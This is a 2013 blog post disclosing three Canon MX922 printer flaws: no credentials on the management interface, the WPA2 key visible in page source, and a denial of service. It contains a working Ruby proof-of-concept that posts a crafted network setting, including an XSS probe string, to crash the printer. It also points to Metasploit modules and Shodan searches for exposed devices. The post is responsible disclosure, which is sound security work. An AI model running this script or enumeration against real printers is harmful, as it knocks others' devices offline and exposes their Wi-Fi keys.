---
title: "Canon, Y U NO Security?"
date: "2013-06-18T08:23:00-04:00"
comments: true
highlight: "true"
categories:
 - http
 - printer
 - canon
 - security
 - hacking
featured_image: y-u-no-guy.jpg
---

I recently bought a new printer at home, so my wife could print coupons without manually attaching to my office printer each time (Thanks coupons.com and all the other shady sites that require spyware-like software to print coupons, and often don't support network printers). I ended up picking up a [Canon MX922](https://www.amazon.com/dp/B00AVWKUJS/ref=as_li_ss_til?tag=mattandcom-20&camp=0&creative=0&linkCode=as4&creativeASIN=B00AVWKUJS&adid=07S04SQ3X3C73H5QDS7T&). It works awesome for her, and is connected over WiFi, so any device in the house can print to it. This got me thinking though, about how secure it was.

<!-- more -->

## No Credentials For Management Interface
### CVE-2013-4613

I found the IP of the status page of my router, and browsed to it. I was greeted with this management page. 

{{% figure class="img-responsive" src="/img/printer_1.png" %}}

I then figured I'd look at some of the more advanced settings, so I clicked the "Advanced" link. This brought me to a control panel for the printer. I saw a bunch of information, and was surprised that I had not entered <b>any</b> credentials. I figured maybe the status page would be anonymous, but surely I'd need some password to access the management pages. But then again, I hadn't used any password when setting up the printer using the LCD.

## Disclosure of Wireless Key and SSID
### CVE-2013-4614

I eventually browsed to the "Network Settings" tab, and saw my SSID of "Wireless". Not too bad, since it's broadcast in the air.

{{% figure class="img-responsive" src="/img/printer_2.png" %}}

I saw that it was using WPA2, as I configured. I clicked the "Modify" button, and saw that I could change all of the wireless settings. The worst was that when I saw the "Use WPA2" radio button, I saw that there was text in the password box.

{{% figure class="img-responsive" src="/img/printer_3.png" %}}

Assuming that there was a junk value in there, I viewed the source. Unfortunately, what I found was that the page did indeed have my printer's WPA2 password right there.

{{% figure class="img-responsive" src="/img/printer_4.png" %}}

I started thinking about this. It wasn't a <i>huge</i> issue, since you'd have to already know my WPA2 key to get to the printer, right? Oh, but what about if a device behind my firewall had been compromised by a remote attacker? The attacker would be free to navigate to my printer, and grab my password. If I was like just about every other person I talk to, I probably use the same password on everything, so I don't have to remember unique passwords. That means now an attacker could potentially login to my email, my SSH server, or even other machines on my LAN. This scared me slightly. 

After a while, I started thinking that perhaps there were people that could potentially put their printers directly connected to the internet, and have these management interfaces publicly exposed to anonymous clients. I checked out the [ShodanHQ](http://www.shodanhq.com/search?q=port%3A80+KS_HTTP+1.0) (FYI, it seems also Minolta uses this server banner as well). I saw that there were nearly 15,000 at the time of this writing, so I wrote up a quick Metasploit module to enumerate the information. It is located [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/canon_wireless.rb). Below is sample output from a selection of hosts I got from ShodanHQ and a host that should time out, as a control sample.

{{% figure class="img-responsive" src="/img/printer_5.png" %}}

## Denial of Service
### CVE-2013-4615

I kept playing around with the configuration interface, and while tinkering with some inputs in [Burp](http://portswigger.net/burp/), the device stopped responding. I walked to the other room, where we keep the printer, and noticed that it was completely unresponsive. I had to power-cycle the device, to which it came back up and told me it wasn't powered down properly.

When I reported this to Canon, they asked me for more information, so I provided them the following code as a proof-of-concept.

```
#!/usr/bin/ruby

require 'net/http'
require 'uri'

print 'Enter your printer IP Address: '
input = gets.strip

printer_url = "http://#{input}"

# Make the first request, to set the IP to invalid data
post = Net::HTTP.post_form(URI.parse(printer_url + '/English/pages_MacUS/cgi_lan.cgi'),
{'OK.x' => '61', 'OK.y' => '12', 'LAN_OPT1' => '2', 'LAN_TXT1' => 'Wireless', 'LAN_OPT3' => '1', 'LAN_TXT21' => '192', 
'LAN_TXT22' => '168', 'LAN_TXT23' => '1', 'LAN_TXT24' => '114"><script>alert(\'xss\');</script>', 'LAN_TXT31' => '255',
'LAN_TXT32' => '255', 'LAN_TXT33' => '255', 'LAN_TXT34' => '0', 'LAN_TXT41' => '192', 'LAN_TXT42' => '168', 
'LAN_TXT43' => '1', 'LAN_TXT44' => '1', 'LAN_OPT2' => '4', 'LAN_OPT4' => '1', 'LAN_HID1' => '1'})

# Make the second request, to trigger the DoS
begin
get = Net::HTTP.get(URI.parse(printer_url + '/English/pages_MacUS/lan_set_content.html'))
rescue Timeout::Error
puts 'Look at your printer to see it is unresponsive.'
end
```

If you look closely, you can see that I was testing for Cross-Site-Scripting, and put HTML in the "LAN_TXT24" input box. Canon's javascript validation prevents this, but nothing stops you from manipulating the HTTP response. This is a prime example of why server-side validation is also required.

I ended up turning this into a Metasploit module as well. You can find it available [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/http/canon_wireless_printer.rb). It works pretty similarly to most DoS modules:

{{% figure class="img-responsive" src="/img/printer_6.png" %}}

## Canon's Response

I responsibly disclosed these vulnerabilities to Canon, but they apparently don't deem them worthy of being fixed. I don't think they really "get it". Since they aren't going to fix it, I am releasing these details publicly. Below is their reply:


>Dear Mr. Andreko,
>
>Thank you for your patience in allowing Canon to respond.  We have confirmed that the two issues you described in your May 27th e-mail can occur in certain printers such as the MX922.  However, with respect to the issue of no password by default, please note that the inkjet printers which have network functionality such as the MX922 are designed for home use which is supposed to be secured.  For this reason, and for user convenience, the default setting does not require a password.  However, if a user has a particular concern about third parties accessing the user’s home printer, the default setting can be changed to add a password.
>
>Similarly, regarding the DoS issue, Canon believes that its printers will not have to deal with unauthorized access to the network from an external location as long as the printers are used in a secured environment.  The issue you described could only occur when unauthorized access to an unsecured network takes place from the outside.  Canon has long advised customers to ensure that their computers and printers are secured when used in a wireless LAN environment.  We will continue advising customers to use our inkjet printers in a secured network environment with a firewall.  However, even if the printer were not used in a secure environment, in the unlikely chance that this type of access occurred from outside, the printer would simply have to be unplugged and re-plugged to ensure normal operation.  In addition, if the network security settings on the printer had been changed by the external source as a result of the incident, then they would have to be changed back to the default settings along with unplugging and re-plugging the power cord to ensure normal operation.
>
>Again, we thank you for giving Canon the opportunity to investigate these issues and to respond to your concerns.
>
>Best regards,
>Joy
>Executive Response Representative
>Canon Customer Relations
>customer@cits.canon.com
>866-886-1901, x 2130


I understand, these vulnerabilites aren't super high priority. They're no ms08-067. But I would still think a vendor would want to fix them. When searching ShodanHQ, I found a bunch of printers from UCLA. I can only imagine the chaos when it becomes finals-week, and all the printers on campus stop working randomly. That'd be bad PR for Canon. Who knows what else is out there. I'd personally be interested in dumping the firmware of the printer, and seeing if there's a way to get remote code execution out of a crash. I'll chalk that up to my TODO list.
